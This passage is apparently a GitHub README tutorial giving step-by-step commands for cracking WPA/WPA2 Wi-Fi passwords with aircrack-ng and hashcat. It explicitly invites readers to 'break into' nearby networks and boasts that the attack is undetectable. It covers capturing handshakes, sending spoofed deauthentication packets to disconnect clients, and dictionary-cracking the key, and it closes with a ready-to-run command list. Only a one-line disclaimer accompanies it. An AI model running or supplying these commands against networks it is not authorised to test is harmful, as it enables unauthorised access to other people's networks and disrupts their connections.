It is not exhaustive, but it should be enough information for you to test your own network's security or break into one nearby. The attack outlined below is entirely passive (listening only, nothing is broadcast from your computer) and it is impossible to detect provided that you don't actually use the password that you crack. An optional active deauthentication attack can be used to speed up the reconnaissance process and is described at the [end of this document](#deauth-attack).\n\nIf you are familiar with this process, you can skip the descriptions and jump to a list of the commands used at [the bottom](#list-of-commands). For a variety of suggestions and alternative methods, see the [appendix](appendix.md). [neal1991](https://github.com/neal1991) and [tiiime](https://github.com/tiiime) have also graciously provided translations to [this document](README.zh.md) and the [appendix](appendix.zh.md) in Chinese if you prefer those versions.\n\n__DISCLAIMER: This software/tutorial is for educational purposes only. It should not be used for illegal activity. The author is not responsible for its use. Don't be a dick.__\n\n## Getting Started\n\nThis tutorial assumes that you:\n\n- Have a general comfortability using the command-line\n- Are running a debian-based linux distro, preferably [Kali linux](https://www.kali.org/) (OSX users see the [appendix](appendix.md))\n- Have [Aircrack-ng](http://aircrack-ng.org/) installed\n\t- `sudo apt-get install aircrack-ng`\n- Have a wireless card that supports [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) (see [here](http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html) for a list of supported devices)\n\n## Cracking a Wi-Fi Network\n\n### Monitor Mode\n\nBegin by listing wireless interfaces that support monitor mode with:\n\n```bash\nairmon-ng\n```\n\nIf you do not see an interface listed then your wireless card does not support monitor mode \ud83d\ude1e\n\nWe will assume your wireless interface name is `wlan0` but be sure to use the correct name if it differs from this. Next, we will place the interface into monitor mode:\n\n```bash\nairmon-ng start wlan0\n```\n\nRun `iwconfig`. You should now see a new monitor mode interface listed (likely `mon0` or `wlan0mon`).\n\n### Find Your Target\n\nStart listening to [802.11 Beacon frames](https://en.wikipedia.org/wiki/Beacon_frame) broadcast by nearby wireless routers using your monitor interface:\n\n```bash\nairodump-ng mon0\n```\n\nYou should see output similar to what is below.\n\n```\nCH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49                                         \n                                                                                                                                              \n BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n                                                                                                                                              \n 14:91:82:F7:52:EB  -66      205       26    0   1  54e  OPN              belkin.2e8.guests                                                   \n 14:91:82:F7:52:E8  -64      212       56    0   1  54e  WPA2 CCMP   PSK  belkin.2e8                                                          \n 14:22:DB:1A:DB:64  -81       44        7    0   1  54   WPA2 CCMP        <length:  0>                                                        \n 14:22:DB:1A:DB:66  -83       48        0    0   1  54e.

Remember the BSSID MAC address and channel (`CH`) number as displayed by `airodump-ng`, as we will need them both for the next step.\n\n### Capture a 4-way Handshake\n\nWPA/WPA2 uses a [4-way handshake](https://security.stackexchange.com/questions/17767/four-way-handshake-in-wpa-personal-wpa-psk) to authenticate devices to the network. You don't have to know anything about what that means, but you do have to capture one of these handshakes in order to crack the network password. These handshakes occur whenever a device connects to the network, for instance, when your neighbor returns home from work. We capture this handshake by directing `airmon-ng` to monitor traffic on the target network using the channel and bssid values discovered from the previous command.\n\n```bash\n# replace -c and --bssid values with the values of your target network\n# -w specifies the directory where we will save the packet capture\nairodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0\n```\n```\n CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        \n                                                                                                                                              \n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n                                                                                                                                              \n 9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS  \n```\n\nNow we wait... Once you've captured a handshake, you should see something like `[ WPA handshake: bc:d3:c9:ef:d2:67` at the top right of the screen, just right of the current time. \n\nIf you are feeling impatient, and are comfortable using an active attack, you can force devices connected to the target network to reconnect, by sending malicious deauthentication packets at them. This often results in the capture of a 4-way handshake. See the [deauth attack section](#deauth-attack) below for info on this. \n\nOnce you've captured a handshake, press `ctrl-c` to quit `airodump-ng`. You should see a `.cap` file wherever you told `airodump-ng` to save the capture (likely called `-01.cap`). We will use this capture file to crack the network password. I like to rename this file to reflect the network name we are trying to crack:\n\n```bash\nmv ./-01.cap hackme.cap\n```\n\n### Crack the Network Password\n\nThe final step is to crack the password using the captured handshake. If you have access to a GPU, I **highly** recommend using `hashcat` for password cracking. I've created a simple tool that makes hashcat super easy to use called [`naive-hashcat`](https://github.com/brannondorsey/naive-hashcat). If you don't have access to a GPU, there are various online GPU cracking services that you can use, like [GPUHASH.me](https://gpuhash.me/) or [OnlineHashCrack](https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php). You can also try your hand at CPU cracking with Aircrack-ng.\n\nNote that both attack methods below assume a relatively weak user generated password. Most WPA/WPA2 routers come with strong 12 character random passwords that many users (rightly) leave unchanged. If you are attempting to crack one of these passwords, I recommend using the [Probable-Wordlists WPA-length](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length) dictionary files.\n\n#### Cracking With `naive-hashcat` (recommended)\n\nBefore we can crack the password using naive-hashcat, we need to convert our `.cap` file to the equivalent hashcat file format `.hccapx`. You can do this easily by either uploading the `.cap` file to <https://hashcat.net/cap2hccapx/> or using the [`cap2hccapx`](https://github.com/hashcat/hashcat-utils) tool directly.\n\n```bash\ncap2hccapx.bin hackme.cap hackme.hccapx\n```\n\nNext, download and run `naive-hashcat`:\n\n```bash\n# download\ngit clone https://github.com/brannondorsey/naive-hashcat\ncd naive-hashcat\n\n# download the 134MB rockyou dictionary file\ncurl -L -o dicts/rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt\n\n# crack ! baby ! crack !\n# 2500 is the hashcat hash mode for WPA/WPA2\nHASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh\n```\n\nNaive-hashcat uses various [dictionary](https://hashcat.net/wiki/doku.php?id=dictionary_attack), [rule](https://hashcat.net/wiki/doku.php?id=rule_based_attack), [combination](https://hashcat.net/wiki/doku.php?id=combinator_attack), and [mask](https://hashcat.net/wiki/doku.php?id=mask_attack) (smart brute-force) attacks and it can take days or even months to run against mid-strength passwords. The cracked password will be saved to hackme.pot, so check this file periodically. Once you've cracked the password, you should see something like this as the contents of your `POT_FILE`:\n\n```\ne30a5a57fc00211fc9f57a4491508cc3:9c5c8ec9abc0:acd1b8dfd971:ASUS:hacktheplanet\n```\n\nWhere the last two fields separated by `:` are the network name and password respectively.\n\nIf you would like to use `hashcat` without `naive-hashcat` see [this page](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2) for info.\n\n#### Cracking With Aircrack-ng\n\nAircrack-ng can be used for very basic dictionary attacks running on your CPU. Before you run the attack you need a wordlist. I recommend using the infamous rockyou dictionary file:\n\n```bash\n# download the 134MB rockyou dictionary file\ncurl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt\n```\n\nNote, that if the network password is not in the wordfile you will not crack the password.\n\n```bash\n# -a2 specifies WPA2, -b is the BSSID, -w is the wordfile\naircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt hackme.cap\n```\n\nIf the password is cracked you will see a `KEY FOUND!` message in the terminal followed by the plain text version of the network password.\n\n```\n                                 Aircrack-ng 1.2 beta3\n\n\n                   [00:01:49] 111040 keys tested (1017.96 k/s)\n\n\n                         KEY FOUND!

These packets include fake \"sender\" addresses that make them appear to the client as if they were sent from the access point themselves. Upon receipt of such packets, most clients disconnect from the network and immediately reconnect, providing you with a 4-way handshake if you are listening with `airodump-ng`. \n\nUse `airodump-ng` to monitor a specific access point (using `-c channel --bssid MAC`) until you see a client (`STATION`) connected. A connected client look something like this, where is `64:BC:0C:48:97:F7` the client MAC.\n\n```\n CH  6 ][ Elapsed: 2 mins ][ 2017-07-23 19:15 ]                                         \n                                                                                                                                           \n BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n                                                                                                                                           \n 9C:5C:8E:C9:AB:C0  -19  75     1043      144   10   6  54e  WPA2 CCMP   PSK  ASUS                                                         \n                                                                                                                                           \n BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                 \n                                                                                                                                           \n 9C:5C:8E:C9:AB:C0  64:BC:0C:48:97:F7  -37    1e- 1e     4     6479  ASUS\n```\n\nNow, leave `airodump-ng` running and open a new terminal. We will use the `aireplay-ng` command to send fake deauth packets to our victim client, forcing it to reconnect to the network and hopefully grabbing a handshake in the process.\n\n```bash\n# -0 2 specifies we would like to send 2 deauth packets. Increase this number\n# if need be with the risk of noticeably interrupting client network activity\n# -a is the MAC of the access point\n# -c is the MAC of the client\naireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0\n```\n\nYou can optionally broadcast deauth packets to all connected clients with:\n\n```bash\n# not all clients respect broadcast deauths though\naireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 mon0\n``` \n\nOnce you've sent the deauth packets, head back over to your `airodump-ng` process, and with any luck you should now see something like this at the top right: `[ WPA handshake: 9C:5C:8E:C9:AB:C0`. Now that you've captured a handshake you should be ready to [crack the network password](#cracking-the-network-password).\n\n## List of Commands\n\nBelow is a list of all of the commands needed to crack a WPA/WPA2 network, in order, with minimal explanation.\n\n```bash\n# put your network device into monitor mode\nairmon-ng start wlan0\n\n# listen for all nearby beacon frames to get target BSSID and channel\nairodump-ng mon0\n\n# start listening for the handshake\nairodump-ng -c 6 --bssid 9C:5C:8E:C9:AB:C0 -w capture/ mon0\n\n# optionally deauth a connected client to force a handshake\naireplay-ng -0 2 -a 9C:5C:8E:C9:AB:C0 -c 64:BC:0C:48:97:F7 mon0\n\n########## crack password with aircrack-ng... ##########\n\n# download 134MB rockyou.txt dictionary file if needed\ncurl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt\n\n# crack w/ aircrack-ng\naircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap\n\n########## or crack password with naive-hashcat ##########\n\n# convert cap to hccapx\ncap2hccapx.bin capture/-01.cap capture/-01.hccapx\n\n# crack with naive-hashcat\nHASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh\n```\n\n## Appendix\n\nThe response to this tutorial was so great that I've added suggestions and additional material from community members as an [appendix](appendix.md). Check it out to learn how to:\n\n- Capture handshakes and crack WPA passwords on MacOS/OSX\n- Capture handshakes from every network around you with `wlandump-ng`\n- Use `crunch` to generate 100+GB wordlists on-the-fly\n- Spoof your MAC address with `macchanger`\n\nA [Chinese version](appendix.zh.md) of the appendix is also available.\n\n## Attribution\n\nMuch of the information presented here was gleaned from [Lewis Encarnacion's awesome tutorial](https://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-kali.html).
